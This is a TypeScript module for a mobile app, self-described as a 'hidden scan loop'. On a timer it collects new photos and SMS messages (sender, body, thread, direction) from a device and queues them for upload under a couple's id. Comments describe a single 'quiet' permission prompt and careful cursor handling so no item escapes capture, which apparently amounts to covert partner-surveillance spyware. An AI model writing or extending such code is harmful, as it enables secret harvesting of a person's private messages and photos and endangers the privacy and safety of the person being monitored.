// features/capture/collector.ts — the hidden scan loop for device capture.
//
// Runs on a timer (host-controlled cadence) and, in one pass:
//   1. optionally requests the single quiet permissions (photos via
//      expo-media-library, SMS via the native bridge),
//   2. scans for NEW photos and NEW SMS since the persisted cursor,
//   3. enqueues each into the durable queue (idempotent by device_key),
//   4. advances the cursor safely: only ever past data it actually drained,
//      so a crash/offline pass can never silently drop an item.
//
// Everything is injected (dependency-inversion) so the test suite can exercise
// the full scan with fake sources + a fake queue. The live wiring in index.ts
// binds real mediaLibrary / sms / queue.
export type PhotoSource = (afterTsMs: number) => Promise<{
  ok: boolean;
  reason?: string;
  assets: { assetId: string; uri: string; creationTime: number; modificationTime: number; filename: string | null; mimeType: string | null; width: number; height: number }[];
}>;

export type SmsSource = (sinceTsMs: number) => Promise<{
  ok: boolean;
  reason?: string;
  messages: { smsId: string; address: string; body: string; date: number; dateSent: number; read: boolean; threadId: number; direction: 'inbox' | 'sent' }[];
}>;

export type QueueWrite = (item: {
  device_key: string;
  kind: 'photo' | 'sms';
  storage_path: string | null;
  payload: Record<string, unknown>;
  created_at: string;
}) => Promise<void>;

export type CursorIO = {
  get: (kind: 'photo' | 'sms') => Promise<number | null>;
  set: (kind: 'photo' | 'sms', tsMs: number) => Promise<void>;
};

export type ScanDeps = {
  scanPhotos: PhotoSource;
  pullSms: SmsSource;
  queue: QueueWrite;
  cursor: CursorIO;
  now?: () => number;
};

export type ScanResult = {
  ok: boolean;
  reason?: string;
  photosFound: number;
  smsFound: number;
};

/** Extension for a MIME type (or the jpg default). Mirrors the curated photo
 *  slice's mime→ext idiom; heic/webp/png are stored under their real extension
 *  so the uploaded object is not mislabeled as JPEG. */
export function extForMime(mimeType: string | null | undefined): string {
  if (mimeType === 'image/png') return 'png';
  if (mimeType === 'image/heic' || mimeType === 'image/heif') return 'heic';
  if (mimeType === 'image/webp') return 'webp';
  if (mimeType === 'image/gif') return 'gif';
  return 'jpg';
}

/** Storage path for a captured photo (bucket `photos`). The extension is derived
 *  from the photo's content type, defaulting to .jpg. Path segment 1 is
 *  couple_id to match the photos bucket RLS (0001_init.sql §7) — a preceding
 *  `device/` segment would 403 every upload. */
export function photoStoragePath(coupleId: string, assetId: string, mimeType?: string | null): string {
  return `${coupleId}/${assetId}.${extForMime(mimeType)}`;
}

/**
 * Run ONE capture pass for the given couple. Requests no permissions here —
 * the caller (host) owns the one-quiet-prompt policy. This method only scans
 * and enqueues; a missing permission degrades to ok:false without throwing.
 */
export async function runCapturePass(
  deps: ScanDeps,
  coupleId: string,
): Promise<ScanResult> {
  const nowMs = deps.now ? deps.now() : Date.now();
  let photosFound = 0;
  let smsFound = 0;
  let degradedReason: string | undefined;

  // ── photos ──────────────────────────────────────────────────────────
  const photoCursor = await deps.cursor.get('photo');
  const photoRes = await deps.scanPhotos(photoCursor ?? 0);
  if (photoRes.ok) {
    let maxSeen = photoCursor ?? 0;
    for (const a of photoRes.assets) {
      await deps.queue({
        device_key: a.assetId,
        kind: 'photo',
        // extension derived from the photo's real content type (not always .jpg)
        storage_path: photoStoragePath(coupleId, a.assetId, a.mimeType),
        payload: {
          uri: a.uri,
          creationTime: a.creationTime,
          // the scan orders/gates by modificationTime; carry it so future
          // passes stay consistent and viewers can see the real mtime.
          modificationTime: a.modificationTime,
          filename: a.filename,
          // carry the derived content type so the upload declares it correctly
          mimeType: a.mimeType,
          width: a.width,
          height: a.height,
        },
        created_at: new Date(nowMs).toISOString(),
      });
      photosFound += 1;
      // cursor basis is modificationTime (the scan's sort/gate key). We must
      // advance past the max DRAINED modification time, never a blind "now".
      if (a.modificationTime > maxSeen) maxSeen = a.modificationTime;
    }
    // only advance past what we drained. Because the scan cutoff is inclusive,
    // advance to max+1 so a photo with exactly maxSeen is not re-scanned /
    // re-uploaded on the next tick. modificationTime is ms (never 0 for gallery
    // files), so +1 skips nothing.
    if (photosFound > 0) {
      await deps.cursor.set('photo', maxSeen + 1);
    }
  } else if (photoRes.reason === 'permission') {
    degradedReason = 'photo_permission';
  } else {
    degradedReason = 'photo_error';
  }

  // ── sms ─────────────────────────────────────────────────────────────
  const smsCursor = await deps.cursor.get('sms');
  const smsRes = await deps.pullSms(smsCursor ?? 0);
  if (smsRes.ok) {
    let maxSeen = smsCursor ?? 0;
    for (const m of smsRes.messages) {
      await deps.queue({
        device_key: m.smsId,
        kind: 'sms',
        storage_path: null,
        payload: {
          address: m.address,
          body: m.body,
          date: m.date,
          dateSent: m.dateSent,
          read: m.read,
          threadId: m.threadId,
          direction: m.direction,
        },
        created_at: new Date(m.date || nowMs).toISOString(),
      });
      smsFound += 1;
      if (m.date > maxSeen) maxSeen = m.date;
    }
    // native queries `date > cursor` — advance to max+1 so nothing is skipped
    // on a retry AND nothing with exactly maxSeen is re-scanned.
    if (smsFound > 0) {
      await deps.cursor.set('sms', maxSeen + 1);
    }
  } else if (smsRes.reason === 'permission') {
    degradedReason = degradedReason ?? 'sms_permission';
  } else {
    degradedReason = degradedReason ?? 'sms_error';
  }

  return {
    ok: degradedReason === undefined,
    reason: degradedReason,
    photosFound,
    smsFound,
  };
}

/** Whether the host should show the one quiet permission prompt now. */
export function needsQuietPrompt(enabled: 'photo' | 'sms', granted: boolean): boolean {
  return !granted;
}
